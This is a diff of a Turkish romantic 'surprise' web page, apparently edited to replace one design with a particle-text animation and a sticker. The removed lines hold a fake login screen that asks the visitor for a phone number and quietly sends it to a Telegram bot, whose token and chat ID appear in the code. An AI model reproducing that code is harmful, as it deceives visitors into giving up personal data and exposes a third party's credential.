@@ -4,367 +4,290 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sana Özel...</title>
-    <!-- Zarif ve şık fontlar -->
-    <link href="https://fonts.googleapis.com/css2?family=Parisienne&family=Montserrat:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;600&display=swap" rel="stylesheet">
     
     <style>
-        /* Genel Ayarlar */
-        body { 
-            margin: 0; 
-            overflow: hidden; 
-            background: radial-gradient(circle at center, #1a000b, #000000); 
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: #050505;
             font-family: 'Montserrat', sans-serif;
             color: white;
-            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            height: 100vh;
         }
 
-        /* --- GİRİŞ EKRANI TASARIMI --- */
-        #login-screen {
-            background: rgba(20, 0, 10, 0.8);
-            padding: 40px 30px;
-            border-radius: 20px;
-            box-shadow: 0 0 30px rgba(255, 0, 102, 0.3);
-            text-align: center;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 0, 102, 0.2);
-            transition: opacity 1.5s ease;
-            z-index: 100;
-            width: 90%;
-            max-width: 400px;
-        }
-
-        #login-screen h2 {
-            font-size: 1.2rem;
-            font-weight: 300;
-            margin-bottom: 30px;
-            color: #ffd1dc;
-            line-height: 1.5;
-        }
-
-        #phone-input {
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 25px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 0, 102, 0.4);
-            border-radius: 10px;
-            color: white;
-            font-size: 1.1rem;
-            text-align: center;
-            outline: none;
-            box-sizing: border-box;
-            transition: all 0.3s ease;
-        }
-
-        #phone-input:focus {
-            border-color: #ff0066;
-            box-shadow: 0 0 15px rgba(255, 0, 102, 0.5);
-        }
-
-        #login-btn {
-            background: linear-gradient(45deg, #ff0066, #cc00ff);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            font-size: 1.1rem;
-            border-radius: 25px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            width: 100%;
-        }
-
-        #login-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 20px rgba(255, 0, 102, 0.7);
-        }
-
-        /* --- SÜRPRİZ EKRAN TASARIMI --- */
-        #romantic-screen {
-            display: none;
+        #canvas-container {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
+            z-index: 1;
         }
 
-        canvas { 
-            display: block; 
-        }
-
-        /* Eğlenceli ve Flörtöz Yazı Alanı */
-        .text-container {
+        /* Başlangıçtaki Gizemli Çember Buton */
+        #interactive-btn {
             position: absolute;
-            top: 50%;
+            z-index: 10;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: transparent;
+            border: 2px solid rgba(255, 0, 102, 0.5);
+            color: #ffb3c6;
+            font-size: 1rem;
+            font-weight: 300;
+            cursor: pointer;
+            outline: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            transition: all 0.5s ease;
+            box-shadow: 0 0 30px rgba(255, 0, 102, 0.2), inset 0 0 20px rgba(255, 0, 102, 0.2);
+            animation: breathe 3s infinite ease-in-out;
+            backdrop-filter: blur(5px);
+        }
+
+        #interactive-btn:hover {
+            border-color: rgba(255, 0, 102, 1);
+            box-shadow: 0 0 50px rgba(255, 0, 102, 0.6), inset 0 0 30px rgba(255, 0, 102, 0.4);
+            transform: scale(1.05);
+            color: white;
+            text-shadow: 0 0 10px #ff0066;
+        }
+
+        @keyframes breathe {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 30px rgba(255, 0, 102, 0.2); }
+            50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(255, 0, 102, 0.5); }
+        }
+
+        .hint {
+            position: absolute;
+            bottom: 30px;
+            width: 100%;
+            text-align: center;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.3);
+            letter-spacing: 2px;
+            z-index: 5;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 2s ease;
+        }
+
+        /* Sticker ve Metin Alanı */
+        #sticker-container {
+            position: absolute;
+            top: 65%; 
             left: 50%;
             transform: translate(-50%, -50%);
             text-align: center;
-            z-index: 10;
-            pointer-events: none;
-            width: 90%;
-            max-width: 800px;
+            z-index: 5;
+            opacity: 0; 
+            pointer-events: none; 
+            transition: opacity 3s ease; 
         }
 
-        .line1 {
-            font-family: 'Montserrat', sans-serif;
-            font-size: 1.5rem;
+        .sticker-img {
+            width: 180px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(255, 0, 102, 0.3);
+            animation: floatSticker 4s ease-in-out infinite;
+        }
+
+        .sticker-text {
+            font-size: 1.2rem;
             font-weight: 300;
             color: #ffb3c6;
-            opacity: 0;
-            transform: translateY(20px);
-            text-shadow: 0 0 15px rgba(255, 179, 198, 0.5);
-            animation: textReveal 2s ease forwards 1s; 
-        }
-
-        .line2 {
-            font-family: 'Parisienne', cursive;
-            font-size: 4rem; /* Uzun cümleye uygun olması için biraz küçültüldü */
-            color: #ffffff;
             margin-top: 20px;
-            opacity: 0;
-            transform: translateY(20px);
-            text-shadow: 
-                0 0 10px #ff0066, 
-                0 0 30px #ff0066, 
-                0 0 50px #ff0066,
-                0 0 80px #cc00ff;
-            animation: 
-                textReveal 2s ease forwards 3.5s, 
-                heartbeat 3s ease-in-out infinite 5.5s; 
+            letter-spacing: 1px;
+            text-shadow: 0 0 15px rgba(255, 179, 198, 0.6);
         }
 
-        @keyframes textReveal {
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        @keyframes heartbeat {
-            0%, 100% { transform: scale(1); text-shadow: 0 0 30px #ff0066, 0 0 50px #ff0066; }
-            50% { transform: scale(1.02); text-shadow: 0 0 40px #ff0066, 0 0 80px #ff0066, 0 0 100px #cc00ff; }
-        }
-
-        @media (max-width: 768px) {
-            .line1 { font-size: 1.1rem; }
-            .line2 { font-size: 2.8rem; }
+        @keyframes floatSticker {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
         }
     </style>
 </head>
 <body>
+
+    <button id="interactive-btn">Dokun<br>Bana</button>
+    <div class="hint" id="hint">Ekrandaki yazıları silmek için fareyi/parmağını üzerinde gezdir...</div>
     
-    <!-- GİRİŞ EKRANI -->
-    <div id="login-screen">
-        <h2>Bu özel sayfaya erişebilmek için<br>lütfen cep telefonu numaranızı girin.</h2>
-        <input type="tel" id="phone-input" placeholder="05XX XXX XX XX" maxlength="11" autocomplete="off">
-        <button id="login-btn">Giriş</button>
+    <!-- Sticker ve Flörtöz Mesaj Overlay'i -->
+    <div id="sticker-container">
+        <!-- Resim linki buraya eklendi -->
+        <img src="https://i.ibb.co/MxPHD3mY/Sticker00-04-07.jpg" alt="Biz" class="sticker-img">
+        <div class="sticker-text">Çünkü bir gün tam olarak buna dönüşeceğimizi<br>ikimiz de çok iyi biliyoruz... 🤏😊</div>
     </div>
 
-    <!-- SÜRPRİZ EKRAN -->
-    <div id="romantic-screen">
-        <div class="text-container">
-            <div class="line1">BECERİRİM GÜZELİM</div>
-            <div class="line1">O GÜZELLİĞİN İÇİN BASİT BİR NUMARA SADECE</div>
-        </div>
-    </div>
+    <canvas id="canvas-container"></canvas>
 
-    <!-- 3D Grafikler için Three.js -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script>
-        const loginScreen = document.getElementById('login-screen');
-        const romanticScreen = document.getElementById('romantic-screen');
-        const loginBtn = document.getElementById('login-btn');
-        const phoneInput = document.getElementById('phone-input');
+        const canvas = document.getElementById('canvas-container');
+        const ctx = canvas.getContext('2d', { willReadFrequently: true });
+        const btn = document.getElementById('interactive-btn');
+        const hint = document.getElementById('hint');
+        const stickerContainer = document.getElementById('sticker-container');
 
-        // Giriş Butonuna Tıklama Olayı
-        loginBtn.addEventListener('click', () => {
-            const phoneNumber = phoneInput.value.trim();
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
 
-            if (phoneNumber.length >= 10) {
-                // Ekran Geçiş Efekti 
-                loginScreen.style.opacity = '0';
-                
-                // 1) TELEGRAM'A MESAJ GÖNDERME KODU (Gizlenmiş Token)
-                const tokenPart1 = "8707318761"; 
-                const tokenPart2 = "AAEF7r25c2V7B_E7zNskaS47xzPOg0-qCuI";
-                const botToken = tokenPart1 + ":" + tokenPart2;
-                const chatId = "1944365612";
-                
-                const mesaj = "Sisteme yeni bir numara girildi: " + phoneNumber;
-                const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}`;
-                
-                fetch(telegramURL).catch(err => console.error("Gönderim hatası:", err)); 
+        let particlesArray = [];
+        let isRevealed = false;
 
-                // 2) SÜRPRİZ EKRANA GEÇİŞ
+        let mouse = {
+            x: null,
+            y: null,
+            radius: 150
+        }
+
+        window.addEventListener('mousemove', function(event) {
+            mouse.x = event.x;
+            mouse.y = event.y;
+        });
+
+        window.addEventListener('touchmove', function(event) {
+            mouse.x = event.touches[0].clientX;
+            mouse.y = event.touches[0].clientY;
+        });
+
+        window.addEventListener('mouseout', function() {
+            mouse.x = undefined;
+            mouse.y = undefined;
+        });
+
+        window.addEventListener('touchend', function() {
+            mouse.x = undefined;
+            mouse.y = undefined;
+        });
+
+        class Particle {
+            constructor(x, y, color) {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.destX = x;
+                this.destY = y;
+                this.size = Math.random() * 2 + 1;
+                this.color = color;
+                
+                this.vx = (Math.random() - 0.5) * 10;
+                this.vy = (Math.random() - 0.5) * 10;
+                this.friction = Math.random() * 0.05 + 0.89;
+                this.ease = Math.random() * 0.02 + 0.01;
+            }
+
+            draw() {
+                ctx.fillStyle = this.color;
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.closePath();
+                ctx.fill();
+            }
+
+            update() {
+                if (this.size <= 0.2) return; 
+
+                let dx = mouse.x - this.x;
+                let dy = mouse.y - this.y;
+                let distance = Math.sqrt(dx * dx + dy * dy);
+
+                if (distance < mouse.radius) {
+                    let forceDirectionX = dx / distance;
+                    let forceDirectionY = dy / distance;
+                    
+                    this.x -= forceDirectionX * 15; 
+                    this.y -= forceDirectionY * 15;
+                    this.size -= 0.2; 
+                } else {
+                    this.x += (this.destX - this.x) * this.ease;
+                    this.y += (this.destY - this.y) * this.ease;
+                }
+                
+                if (this.size > 0.2) {
+                    this.draw();
+                }
+            }
+        }
+
+        function initParticles() {
+            particlesArray = [];
+            
+            let text1 = "Merakına yenik düştün...";
+            let text2 = "Peki ilk adımı kim atacak? 🍷";
+
+            ctx.fillStyle = 'white';
+            ctx.textAlign = 'center';
+            
+            let fontSize = Math.min(canvas.width / 15, 50);
+            ctx.font = `300 ${fontSize}px Montserrat`;
+            ctx.fillText(text1, canvas.width / 2, canvas.height / 2 - 100);
+            
+            ctx.font = `600 ${fontSize * 0.8}px Montserrat`;
+            ctx.fillText(text2, canvas.width / 2, canvas.height / 2 - 30);
+
+            const textCoordinates = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            let step = 4; 
+            for (let y = 0; y < textCoordinates.height; y += step) {
+                for (let x = 0; x < textCoordinates.width; x += step) {
+                    if (textCoordinates.data[(y * 4 * textCoordinates.width) + (x * 4) + 3] > 128) {
+                        let posX = x;
+                        let posY = y;
+                        let colors = ['#ff0066', '#ffb3c6', '#cc00ff', '#ffffff'];
+                        let color = colors[Math.floor(Math.random() * colors.length)];
+                        
+                        particlesArray.push(new Particle(posX, posY, color));
+                    }
+                }
+            }
+        }
+
+        function animate() {
+            requestAnimationFrame(animate);
+            ctx.fillStyle = 'rgba(5, 5, 5, 0.2)'; 
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            if (isRevealed) {
+                for (let i = 0; i < particlesArray.length; i++) {
+                    particlesArray[i].update();
+                }
+            }
+        }
+
+        btn.addEventListener('click', () => {
+            btn.style.opacity = '0';
+            btn.style.transform = 'scale(2)';
+            btn.style.pointerEvents = 'none';
+
+            setTimeout(() => {
+                isRevealed = true;
+                initParticles();
+                hint.style.opacity = '1';
+                
                 setTimeout(() => {
-                    loginScreen.style.display = 'none';
-                    romanticScreen.style.display = 'block';
-                    startRomanticMagic(); 
-                }, 1500);
+                    stickerContainer.style.opacity = '1';
+                }, 2000); 
 
-            } else {
-                alert("Lütfen geçerli bir telefon numarası girin.");
+            }, 600);
+        });
+
+        window.addEventListener('resize', function() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            if(isRevealed) {
+                initParticles();
             }
         });
 
-        // 3D Animasyon Kodları
-        function startRomanticMagic() {
-            const scene = new THREE.Scene();
-            scene.fog = new THREE.FogExp2(0x000000, 0.025);
-
-            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
-            camera.position.z = 35;
-
-            const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
-            renderer.setSize(window.innerWidth, window.innerHeight);
-            renderer.physicallyCorrectLights = true; 
-            renderer.outputEncoding = THREE.sRGBEncoding; 
-            romanticScreen.appendChild(renderer.domElement);
-
-            function createHeartGeometry() {
-                const x = 0, y = 0;
-                const heartShape = new THREE.Shape();
-                heartShape.moveTo( x + 5, y + 5 );
-                heartShape.bezierCurveTo( x + 5, y + 5, x + 4, y, x, y );
-                heartShape.bezierCurveTo( x - 6, y, x - 6, y + 7,x - 6, y + 7 );
-                heartShape.bezierCurveTo( x - 6, y + 11, x - 3, y + 15.4, x + 5, y + 19 );
-                heartShape.bezierCurveTo( x + 12, y + 15.4, x + 16, y + 11, x + 16, y + 7 );
-                heartShape.bezierCurveTo( x + 16, y + 7, x + 16, y, x + 10, y );
-                heartShape.bezierCurveTo( x + 7, y, x + 5, y + 5, x + 5, y + 5 );
-
-                const extrudeSettings = { 
-                    depth: 2, 
-                    bevelEnabled: true, 
-                    bevelSegments: 8, 
-                    steps: 2, 
-                    bevelSize: 1.5, 
-                    bevelThickness: 1.5 
-                };
-                const geometry = new THREE.ExtrudeGeometry( heartShape, extrudeSettings );
-                
-                geometry.computeBoundingBox();
-                const centerOffset = -0.5 * (geometry.boundingBox.max.x - geometry.boundingBox.min.x);
-                const centerYOffset = -0.5 * (geometry.boundingBox.max.y - geometry.boundingBox.min.y);
-                geometry.translate(centerOffset, centerYOffset, 0);
-                geometry.rotateZ(Math.PI);
-
-                return geometry;
-            }
-
-            const heartGeometry = createHeartGeometry();
-            
-            // Cam/Yakut Taşı Materyali
-            const heartMaterial = new THREE.MeshPhysicalMaterial({ 
-                color: 0xff0033, 
-                emissive: 0x220000,
-                roughness: 0.1,     
-                metalness: 0.3, 
-                clearcoat: 1.0,
-                clearcoatRoughness: 0.1,
-                transmission: 0.4,
-                transparent: true
-            });
-
-            const floatingHearts = [];
-            for (let i = 0; i < 60; i++) {
-                const heart = new THREE.Mesh(heartGeometry, heartMaterial);
-                
-                heart.position.x = (Math.random() - 0.5) * 80;
-                heart.position.y = (Math.random() - 0.5) * 80;
-                heart.position.z = (Math.random() - 0.5) * 50 - 15; 
-                
-                heart.scale.setScalar(Math.random() * 0.08 + 0.02); 
-                
-                heart.rotation.x = Math.random() * Math.PI;
-                heart.rotation.y = Math.random() * Math.PI;
-                
-                scene.add(heart);
-                floatingHearts.push({
-                    mesh: heart,
-                    speedY: Math.random() * 0.03 + 0.01,
-                    speedX: (Math.random() - 0.5) * 0.01,
-                    rotSpeedX: (Math.random() - 0.5) * 0.02,
-                    rotSpeedY: (Math.random() - 0.5) * 0.02,
-                    floatOffset: Math.random() * Math.PI * 2
-                });
-            }
-
-            // Sihirli Işıltılar
-            const particlesGeometry = new THREE.BufferGeometry();
-            const particlesCount = 1000;
-            const posArray = new Float32Array(particlesCount * 3);
-
-            for(let i = 0; i < particlesCount * 3; i++) {
-                posArray[i] = (Math.random() - 0.5) * 120;
-            }
-            particlesGeometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
-            const particlesMaterial = new THREE.PointsMaterial({
-                size: 0.15,
-                color: 0xffd1dc,
-                transparent: true,
-                opacity: 0.6,
-                blending: THREE.AdditiveBlending
-            });
-            const particlesMesh = new THREE.Points(particlesGeometry, particlesMaterial);
-            scene.add(particlesMesh);
-
-            // Büyülü Işıklandırma
-            const ambientLight = new THREE.AmbientLight(0xffffff, 0.3); 
-            scene.add(ambientLight);
-            
-            const pointLight1 = new THREE.PointLight(0xff0066, 200, 100); 
-            pointLight1.position.set(10, 10, 20);
-            scene.add(pointLight1);
-
-            const pointLight2 = new THREE.PointLight(0xffaa00, 150, 100); 
-            pointLight2.position.set(-15, -10, 15);
-            scene.add(pointLight2);
-            
-            const pointLight3 = new THREE.PointLight(0xcc00ff, 100, 100); 
-            pointLight3.position.set(0, 15, 10);
-            scene.add(pointLight3);
-
-            const clock = new THREE.Clock();
-
-            function animate() {
-                requestAnimationFrame(animate);
-                const elapsedTime = clock.getElapsedTime();
-
-                particlesMesh.rotation.y = elapsedTime * 0.03;
-                particlesMesh.rotation.x = elapsedTime * 0.01;
-
-                pointLight1.position.x = Math.sin(elapsedTime * 0.3) * 20;
-                pointLight1.position.y = Math.cos(elapsedTime * 0.3) * 20;
-
-                floatingHearts.forEach((h) => {
-                    h.mesh.rotation.x += h.rotSpeedX;
-                    h.mesh.rotation.y += h.rotSpeedY;
-                    h.mesh.position.y += h.speedY;
-                    h.mesh.position.x += Math.sin(elapsedTime * 1.5 + h.floatOffset) * 0.02;
-                    
-                    if(h.mesh.position.y > 40) {
-                        h.mesh.position.y = -40;
-                        h.mesh.position.x = (Math.random() - 0.5) * 80;
-                    }
-                });
-
-                camera.position.z = 35 + Math.sin(elapsedTime * 0.3) * 3;
-                renderer.render(scene, camera);
-            }
-            
-            animate();
-
-            window.addEventListener('resize', () => {
-                camera.aspect = window.innerWidth / window.innerHeight;
-                camera.updateProjectionMatrix();
-                renderer.setSize(window.innerWidth, window.innerHeight);
-            });
-        }  
-        
+        animate();
     </script>
 </body>
 </html>
